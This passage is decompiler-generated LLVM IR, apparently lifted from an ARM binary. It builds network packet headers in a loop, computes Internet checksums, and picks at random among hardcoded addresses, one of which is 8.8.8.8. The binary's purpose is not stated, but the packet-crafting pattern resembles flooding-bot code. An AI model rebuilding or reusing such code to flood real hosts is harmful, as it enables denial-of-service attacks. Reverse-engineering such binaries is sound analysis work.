  store i32 %v2_c1ac, i32* %r3.global-to-local, align 4
  store i32 %v3_c450, i32* %ip.global-to-local, align 4
  %v4_c6a4 = mul i32 %v1_c6a4, 4
  %v5_c6a4 = add i32 %v4_c6a4, %v2_c1ac
  %v6_c6a4 = inttoptr i32 %v5_c6a4 to i32*
  %v7_c6a4 = load i32, i32* %v6_c6a4, align 4
  store i32 %v7_c6a4, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_c6ac, i1* %cpsr_z.global-to-local, align 1
  %v1_c6b0 = add i32 %v7_c6a4, 20
  store i32 %v1_c6b0, i32* @r6, align 4
  br i1 %v3_c6ac, label %dec_label_pc_c788, label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c698
  store i32 %v3_c458, i32* @lr, align 4
  store i1 %v3_c6bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c6bc, label %dec_label_pc_c79c, label %dec_label_pc_c6c4

dec_label_pc_c6c4:                                ; preds = %dec_label_pc_c788.dec_label_pc_c6c4_crit_edge, %dec_label_pc_c6b8
  %v1_c6c8 = phi i32 [ %v1_c6c8.pre, %dec_label_pc_c788.dec_label_pc_c6c4_crit_edge ], [ 65535, %dec_label_pc_c6b8 ]
  store i32 %v3_c474, i32* %r0.global-to-local, align 4
  %v9_c6c8 = icmp eq i32 %v3_c474, %v1_c6c8
  store i1 %v9_c6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6c8, label %dec_label_pc_c7b0, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c79c, %dec_label_pc_c6c4
  %v1_c6d4 = phi i32 [ %v1_c7a8, %dec_label_pc_c79c ], [ %v1_c6c8, %dec_label_pc_c6c4 ]
  store i32 %v3_c47c, i32* %r2.global-to-local, align 4
  %v9_c6d4 = icmp eq i32 %v3_c47c, %v1_c6d4
  store i1 %v9_c6d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6d4, label %dec_label_pc_c7c4, label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c7b0, %dec_label_pc_c6d0, %dec_label_pc_c7c4
  %v0_c6dc = load i32, i32* @r4, align 4
  %v1_c6dc = add i32 %v0_c6dc, 41
  store i32 %v1_c6dc, i32* %r0.global-to-local, align 4
  store i32 %v4_c6e0.pre-phi, i32* %r1.global-to-local, align 4
  %v2_c6e4 = call i32 @function_e17c(i32 %v1_c6dc, i32 %v4_c6e0.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c6ec = load i32, i32* @r4, align 4
  %v3_c6ec = add i32 %v2_c6ec, 10
  %v4_c6ec = inttoptr i32 %v3_c6ec to i16*
  store i16 0, i16* %v4_c6ec, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c6f4 = load i32, i32* @r4, align 4
  store i32 %v0_c6f4, i32* @r0, align 4
  %v2_c6f8 = call i32 @function_c848(i32 %v0_c6f4, i32 20)
  %v3_c6f8 = trunc i32 %v2_c6f8 to i16
  store i32 %v2_c6f8, i32* %r0.global-to-local, align 4
  %v3_c6fc = load i32, i32* @r4, align 4
  %v4_c6fc = add i32 %v3_c6fc, 10
  %v5_c6fc = inttoptr i32 %v4_c6fc to i16*
  store i16 %v3_c6f8, i16* %v5_c6fc, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_c704 = load i32, i32* @r6, align 4
  %v3_c704 = add i32 %v2_c704, 6
  %v4_c704 = inttoptr i32 %v3_c704 to i16*
  store i16 0, i16* %v4_c704, align 2
  %v0_c708 = load i32, i32* @r6, align 4
  store i32 %v0_c708, i32* @r1, align 4
  %v1_c70c = add i32 %v0_c708, 4
  %v2_c70c = inttoptr i32 %v1_c70c to i16*
  %v3_c70c = load i16, i16* %v2_c70c, align 2
  %v4_c70c = zext i16 %v3_c70c to i32
  store i32 %v4_c70c, i32* %r2.global-to-local, align 4
  %v0_c710 = load i32, i32* @sb, align 4
  store i32 %v0_c710, i32* %r3.global-to-local, align 4
  %v0_c714 = load i32, i32* @r4, align 4
  store i32 %v0_c714, i32* %r0.global-to-local, align 4
  %v4_c718 = call i32 @function_c898(i32 %v0_c714, i32 %v0_c708, i32 %v4_c70c, i32 %v0_c710)
  %v5_c718 = trunc i32 %v4_c718 to i16
  store i32 %v4_c718, i32* %r0.global-to-local, align 4
  %v3_c71c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c71c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_c724 = mul i32 %v3_c71c, 32
  store i32 %v3_c724, i32* %ip.global-to-local, align 4
  %v3_c728 = load i32, i32* @r6, align 4
  %v4_c728 = add i32 %v3_c728, 6
  %v5_c728 = inttoptr i32 %v4_c728 to i16*
  store i16 %v5_c718, i16* %v5_c728, align 2
  %v0_c72c = load i32, i32* %ip.global-to-local, align 4
  %v1_c72c = load i32, i32* %r3.global-to-local, align 4
  %tmp128 = mul i32 %v1_c72c, -8
  %v5_c72c = add i32 %v0_c72c, %tmp128
  store i32 %v5_c72c, i32* %ip.global-to-local, align 4
  %v0_c730 = load i32, i32* @r6, align 4
  %v1_c730 = add i32 %v0_c730, 2
  %v2_c730 = inttoptr i32 %v1_c730 to i16*
  %v3_c730 = load i16, i16* %v2_c730, align 2
  %v1_c734 = load i32, i32* @lr, align 4
  %v2_c734 = add i32 %v1_c734, %v5_c72c
  store i32 %v2_c734, i32* %ip.global-to-local, align 4
  %v3_c738 = add i32 %v2_c734, 2
  %v4_c738 = inttoptr i32 %v3_c738 to i16*
  store i16 %v3_c730, i16* %v4_c738, align 2
  %v0_c73c = load i32, i32* @fp, align 4
  %v1_c73c = load i32, i32* %ip.global-to-local, align 4
  %v2_c73c = add i32 %v1_c73c, 4
  %v3_c73c = inttoptr i32 %v2_c73c to i32*
  store i32 %v0_c73c, i32* %v3_c73c, align 4
  %v0_c740 = load i32, i32* @r4, align 4
  store i32 %v0_c740, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  %v0_c74c = load i32, i32* @sl, align 4
  store i32 %v0_c74c, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_c754 = load i32, i32* %ip.global-to-local, align 4
  %v6_c75c = call i32 @function_11570(i32 %v3_c3f4, i32 %v0_c740, i32 %v0_c74c, i32 16384, i32 %v0_c754, i32 16)
  %v3_c760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c760, i32* %r3.global-to-local, align 4
  %v1_c764 = add i32 %v3_c760, 1
  store i32 %v1_c764, i32* %r0.global-to-local, align 4
  %v0_c768 = load i32, i32* @r8, align 4
  %v9_c768 = icmp eq i32 %v0_c768, %v1_c764
  store i1 %v9_c768, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c764, i32* %stack_var_-44, align 4
  %v8_c770 = icmp sgt i32 %v0_c768, %v1_c764
  br i1 %v8_c770, label %dec_label_pc_c698, label %dec_label_pc_c774

dec_label_pc_c774:                                ; preds = %dec_label_pc_c6dc
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c778 = icmp eq i32 %v0_c768, 0
  store i1 %v2_c778, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c778, label %dec_label_pc_c67c, label %dec_label_pc_c68c

dec_label_pc_c788:                                ; preds = %dec_label_pc_c698
  %v0_c788 = call i32 @function_e0b8()
  %v1_c788 = trunc i32 %v0_c788 to i16
  store i32 %v0_c788, i32* %r0.global-to-local, align 4
  store i32 %v3_c458, i32* @lr, align 4
  %v1_c790 = load i32, i32* @r5, align 4
  %v9_c790 = icmp eq i32 %v3_c458, %v1_c790
  store i1 %v9_c790, i1* %cpsr_z.global-to-local, align 1
  %v3_c794 = load i32, i32* @r4, align 4
  %v4_c794 = add i32 %v3_c794, 4
  %v5_c794 = inttoptr i32 %v4_c794 to i16*
  store i16 %v1_c788, i16* %v5_c794, align 2
  br i1 %v9_c790, label %dec_label_pc_c79c, label %dec_label_pc_c788.dec_label_pc_c6c4_crit_edge

dec_label_pc_c788.dec_label_pc_c6c4_crit_edge:    ; preds = %dec_label_pc_c788
  %v1_c6c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c6c4

dec_label_pc_c79c:                                ; preds = %dec_label_pc_c788, %dec_label_pc_c6b8
  %v0_c79c = call i32 @function_e0b8()
  %v1_c79c = trunc i32 %v0_c79c to i16
  %v3_c7a0 = load i32, i32* @r4, align 4
  %v4_c7a0 = add i32 %v3_c7a0, 20
  %v5_c7a0 = inttoptr i32 %v4_c7a0 to i16*
  store i16 %v1_c79c, i16* %v5_c7a0, align 2
  store i32 %v3_c474, i32* %r0.global-to-local, align 4
  %v1_c7a8 = load i32, i32* @r5, align 4
  %v9_c7a8 = icmp eq i32 %v3_c474, %v1_c7a8
  store i1 %v9_c7a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7a8, label %dec_label_pc_c7b0, label %dec_label_pc_c6d0

dec_label_pc_c7b0:                                ; preds = %dec_label_pc_c79c, %dec_label_pc_c6c4
  %v0_c7b0 = call i32 @function_e0b8()
  %v1_c7b0 = trunc i32 %v0_c7b0 to i16
  store i32 %v0_c7b0, i32* %r0.global-to-local, align 4
  store i32 %v3_c47c, i32* %r2.global-to-local, align 4
  %v1_c7b8 = load i32, i32* @r5, align 4
  %v9_c7b8 = icmp eq i32 %v3_c47c, %v1_c7b8
  store i1 %v9_c7b8, i1* %cpsr_z.global-to-local, align 1
  %v3_c7bc = load i32, i32* @r6, align 4
  %v4_c7bc = add i32 %v3_c7bc, 2
  %v5_c7bc = inttoptr i32 %v4_c7bc to i16*
  store i16 %v1_c7b0, i16* %v5_c7bc, align 2
  br i1 %v9_c7b8, label %dec_label_pc_c7c4, label %dec_label_pc_c6dc

dec_label_pc_c7c4:                                ; preds = %dec_label_pc_c7b0, %dec_label_pc_c6d0
  %v0_c7c4 = call i32 @function_e0b8()
  %v1_c7c4 = trunc i32 %v0_c7c4 to i16
  store i32 %v0_c7c4, i32* %r0.global-to-local, align 4
  %v3_c7c8 = load i32, i32* @r4, align 4
  %v4_c7c8 = add i32 %v3_c7c8, 28
  %v5_c7c8 = inttoptr i32 %v4_c7c8 to i16*
  store i16 %v1_c7c4, i16* %v5_c7c8, align 2
  br label %dec_label_pc_c6dc

dec_label_pc_c7d0:                                ; preds = %dec_label_pc_c35c, %dec_label_pc_c33c, %dec_label_pc_c2e0, %dec_label_pc_c18c
  %v0_c7d0 = call i32 @function_e0b8()
  %v1_c7d4 = urem i32 %v0_c7d0, 4
  store i32 %v1_c7d4, i32* %r0.global-to-local, align 4
  %v2_c7d8 = icmp eq i32 %v1_c7d4, 3
  store i1 %v2_c7d8, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_c7d0 to i2
  switch i2 %trunc, label %dec_label_pc_c3d49 [
    i2 0, label %dec_label_pc_c80c
    i2 1, label %dec_label_pc_c838
    i2 -2, label %dec_label_pc_c82c
    i2 -1, label %dec_label_pc_c81c
  ]

dec_label_pc_c7f4:                                ; preds = %dec_label_pc_c404
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  %v1_c7f8 = call i32 @function_10ddc(i32 %v3_c3f4)
  store i32 %v1_c7f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c7fc

dec_label_pc_c7fc:                                ; preds = %dec_label_pc_c3dc, %dec_label_pc_c3d4, %dec_label_pc_c7f4
  %v1_c808 = phi i32 [ %v3_c3f4, %dec_label_pc_c3dc ], [ %v1_c80849, %dec_label_pc_c3d4 ], [ %v1_c7f8, %dec_label_pc_c7f4 ]
  store i32 %v18_c18c, i32* %sb.global-to-local, align 4
  store i32 %v27_c18c, i32* %lr.global-to-local, align 4
  ret i32 %v1_c808

dec_label_pc_c80c:                                ; preds = %dec_label_pc_c7d0
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_c3d4

dec_label_pc_c81c:                                ; preds = %dec_label_pc_c7d0
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_c3d4

dec_label_pc_c82c:                                ; preds = %dec_label_pc_c7d0
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_c3d4

dec_label_pc_c838:                                ; preds = %dec_label_pc_c7d0
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_c3d4

; uselistorder directives
  uselistorder i32 %v1_c7d4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_c7d0, { 1, 0 }
  uselistorder i32 %v0_c7c4, { 1, 0 }
  uselistorder i32 %v0_c7b0, { 1, 0 }
  uselistorder i32 %v1_c7a8, { 1, 0 }
  uselistorder i32 %v0_c788, { 1, 0 }
  uselistorder i32 %v1_c764, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c72c, { 1, 0 }
  uselistorder i32 %v4_c718, { 1, 0 }
  uselistorder i32 %v2_c6f8, { 1, 0 }
  uselistorder i1 %v3_c6bc, { 1, 0 }
  uselistorder i1 %v3_c6ac, { 1, 0 }
  uselistorder i32 %v4_c6e0.pre-phi, { 1, 0 }
  uselistorder i32 %v1_c654, { 1, 0, 2 }
  uselistorder i32 %v0_c644, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_c630, { 2, 0, 3, 1 }
  uselistorder i32 %v0_c62c, { 1, 0, 2 }
  uselistorder i32 %v0_c59c, { 1, 0 }
  uselistorder i32 %v4_c598, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp111, { 1, 0 }
  uselistorder i32 %v3_c4e4, { 1, 0 }
  uselistorder i32 %v3_c4a0, { 1, 0 }
  uselistorder i32 %v1_c494, { 2, 0, 1 }
  uselistorder i32 %v3_c460, { 1, 0 }
  uselistorder i32 %v3_c458, { 1, 2, 3, 5, 0, 4 }
  uselistorder i32 %v3_c450, { 0, 2, 1 }
  uselistorder i8 %v5_c448, { 1, 0, 2 }
  uselistorder i32 %v1_c434, { 1, 0 }
  uselistorder i32 %v0_c434, { 1, 0 }
  uselistorder i1 %v7_c424, { 1, 0 }
  uselistorder i1 %v7_c3f8, { 1, 0 }
  uselistorder i32 %v3_c3f4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_c3d4, { 1, 0, 2 }
  uselistorder i32 %v2_c3a4, { 0, 1, 3, 2 }
  uselistorder i32 %v2_c3a0, { 1, 0, 2 }
  uselistorder i1 %v7_c390, { 1, 0 }
  uselistorder i32 %v1_c38c, { 1, 0, 2 }
  uselistorder i1 %v8_c384, { 1, 0 }
  uselistorder i1 %v7_c380, { 1, 0 }
  uselistorder i32 %v1_c374, { 1, 0 }
  uselistorder i8 %v2_c368, { 2, 0, 1, 3 }
  uselistorder i32 %v0_c36c, { 1, 0 }
  uselistorder i32 %v0_c38c, { 3, 0, 2, 1 }
  uselistorder i32 %v0_c35c, { 0, 2, 1 }
  uselistorder i32 %v1_c370, { 0, 2, 1 }
  uselistorder i32 %v2_c344, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c33c, { 1, 0, 2, 3 }
  uselistorder i1 %v7_c334, { 1, 0 }
  uselistorder i32 %v0_c334, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_c2d8, { 1, 0, 3, 2 }
  uselistorder i32 %v6_c278, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c25c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c244, { 2, 1, 0, 3 }
  uselistorder i32 %v1_c22c, { 1, 2, 0 }
  uselistorder i32 %v5_c220, { 0, 2, 1 }
  uselistorder i32 %v7_c1e8, { 1, 0, 2, 3 }
  uselistorder i32 %v5_c1e8, { 0, 2, 1 }
  uselistorder i32 %v2_c1ac, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 37, 36, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 6, 5, 8, 7, 9, 11, 10, 12, 13, 14, 16, 15, 19, 17, 18, 20, 21, 26, 22, 23, 24, 25, 30, 27, 28, 29, 31, 33, 32, 34, 35, 36, 37, 39, 38, 40, 41, 43, 42, 44, 58, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 18, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 26, 27, 28, 25, 22, 29, 30, 31 }
  uselistorder i16 64, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 41, { 2, 3, 4, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c7fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c6dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c68c, { 1, 0 }
  uselistorder label %dec_label_pc_c67c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c67c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_c64c, { 1, 0 }
  uselistorder label %.thread18, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %dec_label_pc_c39c, { 1, 0 }
  uselistorder label %dec_label_pc_c390, { 1, 0 }
  uselistorder label %dec_label_pc_c35c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c354, { 1, 0 }
}

define i32 @function_c848(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c848:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c86c, label %dec_label_pc_c854

dec_label_pc_c854:                                ; preds = %dec_label_pc_c848
  %v0_c85c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c858

dec_label_pc_c858:                                ; preds = %dec_label_pc_c858, %dec_label_pc_c854
  %v0_c864 = phi i32 [ %v2_c864, %dec_label_pc_c858 ], [ 0, %dec_label_pc_c854 ]
  %v0_c85c = phi i32 [ %v5_c85c, %dec_label_pc_c858 ], [ %v0_c85c.pre, %dec_label_pc_c854 ]
  %v0_c858 = phi i32 [ %v1_c858, %dec_label_pc_c858 ], [ %arg1, %dec_label_pc_c854 ]
  %v1_c858 = add i32 %v0_c858, -2
  %v1_c85c = inttoptr i32 %v0_c85c to i16*
  %v2_c85c = load i16, i16* %v1_c85c, align 2
  %v3_c85c = zext i16 %v2_c85c to i32
  %v5_c85c = add i32 %v0_c85c, -2
  store i32 %v5_c85c, i32* @r0, align 4
  %v2_c864 = add i32 %v3_c85c, %v0_c864
  %v1_c858.cmp = icmp ugt i32 %v1_c858, 1
  br i1 %v1_c858.cmp, label %dec_label_pc_c858, label %dec_label_pc_c86c.loopexit

dec_label_pc_c86c.loopexit:                       ; preds = %dec_label_pc_c858
  br label %dec_label_pc_c86c

dec_label_pc_c86c:                                ; preds = %dec_label_pc_c848, %dec_label_pc_c86c.loopexit
  %v1_c874 = phi i32 [ %v2_c864, %dec_label_pc_c86c.loopexit ], [ 0, %dec_label_pc_c848 ]
  %v0_c86c = phi i32 [ %v1_c858, %dec_label_pc_c86c.loopexit ], [ %arg1, %dec_label_pc_c848 ]
  %v7_c86c = icmp eq i32 %v0_c86c, 1
  br i1 %v7_c86c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c86c
  %v1_c870 = load i32, i32* @r0, align 4
  %v2_c870 = inttoptr i32 %v1_c870 to i8*
  %v3_c870 = load i8, i8* %v2_c870, align 1
  %v4_c870 = zext i8 %v3_c870 to i32
  %v3_c874 = add i32 %v1_c874, %v4_c870
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c86c, %bb
  %v0_c878 = phi i32 [ %v1_c874, %dec_label_pc_c86c ], [ %v3_c874, %bb ]
  %v3_c87c = urem i32 %v0_c878, 65536
  %v4_c880 = udiv i32 %v0_c878, 65536
  %v5_c880 = add nuw nsw i32 %v4_c880, %v3_c87c
  %v4_c884 = udiv i32 %v5_c880, 65536
  %v5_c884 = add nuw nsw i32 %v4_c884, %v5_c880
  %v1_c888 = urem i32 %v5_c884, 65536
  %v3_c890 = xor i32 %v1_c888, 65535
  ret i32 %v3_c890

; uselistorder directives
  uselistorder i32 %v5_c880, { 1, 0 }
  uselistorder i32 %v5_c85c, { 1, 0 }
  uselistorder i32 %v1_c858, { 1, 0, 2 }
  uselistorder i32 %v0_c85c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c86c, { 1, 0 }
}

define i32 @function_c898(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c898:
  %v1_c8a8 = add i32 %arg1, 12
  %v2_c8a8 = inttoptr i32 %v1_c8a8 to i32*
  %v3_c8a8 = load i32, i32* %v2_c8a8, align 4
  %v1_c8ac = add i32 %arg1, 16
  %v2_c8ac = inttoptr i32 %v1_c8ac to i32*
  %v3_c8ac = load i32, i32* %v2_c8ac, align 4
  %v7_c8b0 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8b0, label %dec_label_pc_c8bc.preheader, label %dec_label_pc_c8d0

dec_label_pc_c8bc.preheader:                      ; preds = %dec_label_pc_c898
  %v0_c8c0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c8bc

dec_label_pc_c8bc:                                ; preds = %dec_label_pc_c8bc.preheader, %dec_label_pc_c8bc
  %v0_c8c8 = phi i32 [ 0, %dec_label_pc_c8bc.preheader ], [ %v2_c8c8, %dec_label_pc_c8bc ]
  %v0_c8c0 = phi i32 [ %v0_c8c0.pre, %dec_label_pc_c8bc.preheader ], [ %v5_c8c0, %dec_label_pc_c8bc ]
  %v0_c8bc = phi i32 [ %arg3, %dec_label_pc_c8bc.preheader ], [ %v1_c8bc, %dec_label_pc_c8bc ]
  %v1_c8bc = add nsw i32 %v0_c8bc, -2
  %v1_c8c0 = inttoptr i32 %v0_c8c0 to i16*
  %v2_c8c0 = load i16, i16* %v1_c8c0, align 2
  %v3_c8c0 = zext i16 %v2_c8c0 to i32
  %v5_c8c0 = add i32 %v0_c8c0, -2
  store i32 %v5_c8c0, i32* @r1, align 4
  %v2_c8c8 = add i32 %v3_c8c0, %v0_c8c8
  %v8_c8cc = icmp sgt i32 %v1_c8bc, 1
  br i1 %v8_c8cc, label %dec_label_pc_c8bc, label %dec_label_pc_c8d0.loopexit

dec_label_pc_c8d0.loopexit:                       ; preds = %dec_label_pc_c8bc
  br label %dec_label_pc_c8d0

dec_label_pc_c8d0:                                ; preds = %dec_label_pc_c8d0.loopexit, %dec_label_pc_c898
  %v1_c8dc = phi i32 [ %v2_c8c8, %dec_label_pc_c8d0.loopexit ], [ 0, %dec_label_pc_c898 ]
  %v0_c8d0 = phi i32 [ %v1_c8bc, %dec_label_pc_c8d0.loopexit ], [ %arg3, %dec_label_pc_c898 ]
  %v7_c8d0 = icmp eq i32 %v0_c8d0, 1
  br i1 %v7_c8d0, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c8d0
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c8d0
  %v1_c8d4 = load i32, i32* @r1, align 4
  %v2_c8d4 = inttoptr i32 %v1_c8d4 to i8*
  %v3_c8d4 = load i8, i8* %v2_c8d4, align 1
  %v4_c8d4 = zext i8 %v3_c8d4 to i32
  %v3_c8dc = add i32 %v4_c8d4, %v1_c8dc
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c904 = phi i32 [ %v1_c8dc, %.thread ], [ %v3_c8dc, %bb ]
  %v0_c8e4 = mul i32 %v3_c8a8, 65536
  %v3_c8e4 = udiv i32 %v0_c8e4, 65536
  %v3_c8e8 = urem i32 %v3_c8ac, 65536
  %v4_c8f0 = udiv i32 %v3_c8a8, 65536
  %v2_c8ec = add nuw nsw i32 %v3_c8e8, %v4_c8f0
  %v5_c8f0 = add nuw nsw i32 %v2_c8ec, %v3_c8e4
  %v1_c8f4 = add i32 %arg1, 9
  %v2_c8f4 = inttoptr i32 %v1_c8f4 to i8*
  %v3_c8f4 = load i8, i8* %v2_c8f4, align 1
  %v4_c8f4 = zext i8 %v3_c8f4 to i32
  %v4_c8f8 = udiv i32 %v3_c8ac, 65536
  %v3_c900 = mul nuw nsw i32 %v4_c8f4, 256
  %v5_c8f8 = add i32 %v4_c8f8, %arg2
  %v2_c8fc = add i32 %v5_c8f8, %v1_c904
  %v2_c904 = add i32 %v2_c8fc, %v5_c8f0
  %v2_c908 = add i32 %v2_c904, %v3_c900
  %tmp = icmp ult i32 %v2_c908, 65536
  br i1 %tmp, label %dec_label_pc_c928, label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %bb19, %dec_label_pc_c914
  %v2_c91c5 = phi i32 [ %v2_c91c, %dec_label_pc_c914 ], [ %v2_c908, %bb19 ]
  %v3_c9206.in = phi i32 [ %v2_c91c, %dec_label_pc_c914 ], [ %v2_c908, %bb19 ]
  %v3_c9206 = udiv i32 %v3_c9206.in, 65536
  %v3_c918 = urem i32 %v2_c91c5, 65536
  %v2_c91c = add nuw nsw i32 %v3_c918, %v3_c9206
  %tmp20 = icmp ult i32 %v2_c91c, 65536
  br i1 %tmp20, label %dec_label_pc_c928.loopexit, label %dec_label_pc_c914

dec_label_pc_c928.loopexit:                       ; preds = %dec_label_pc_c914
  br label %dec_label_pc_c928

dec_label_pc_c928:                                ; preds = %dec_label_pc_c928.loopexit, %bb19
  %v0_c928 = phi i32 [ %v2_c91c, %dec_label_pc_c928.loopexit ], [ %v2_c908, %bb19 ]
  %v1_c928 = urem i32 %v0_c928, 65536
  %v3_c930 = xor i32 %v1_c928, 65535
  ret i32 %v3_c930

; uselistorder directives
  uselistorder i32 %v2_c91c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c908, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c8dc, { 1, 0 }
  uselistorder i32 %v5_c8c0, { 1, 0 }
  uselistorder i32 %v0_c8c0, { 1, 0 }
  uselistorder i32 %v3_c8a8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c914, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c8bc, { 1, 0 }
}

define i32 @function_c93c(i32 %arg1) local_unnamed_addr {
dec_label_pc_c93c:
  %v2_c948 = load i32, i32* @global_var_20a64.58, align 4
  %v2_c950 = call i32 @function_10ba8(i32 %v2_c948, i32 9)
  ret i32 %v2_c950
}

define i32 @function_c964(i32 %arg1) local_unnamed_addr {
dec_label_pc_c964:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c964 = load i32, i32* @r4, align 4
  %v6_c964 = load i32, i32* @r5, align 4
  %v9_c964 = load i32, i32* @r6, align 4
  %v12_c964 = load i32, i32* @r7, align 4
  %v15_c964 = load i32, i32* @r8, align 4
  %v18_c964 = load i32, i32* @sb, align 4
  %v21_c964 = load i32, i32* @sl, align 4
  %v24_c964 = load i32, i32* @fp, align 4
  %v27_c964 = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c980 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c980, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  store i32 513, i32* @r2, align 4
  %v2_c9ac = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c9ac, i32* @fp, align 4
  %v3_c9b8 = call i32 @function_11260(i8* nonnull %stack_var_-585, i32 0)
  %v2_c9bc = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_c9bc, i32* @sl, align 4
  %v0_c9c0 = load i32, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  %v2_c9cc = bitcast i32* %stack_var_-8777 to i8*
  %v3_c9cc = call i32 @function_11260(i8* %v2_c9cc, i32 %v0_c9c0)
  %v0_c9d4 = load i32, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  %v2_c9e0 = bitcast i32* %stack_var_-4681 to i8*
  %v3_c9e0 = call i32 @function_11260(i8* %v2_c9e0, i32 %v0_c9d4)
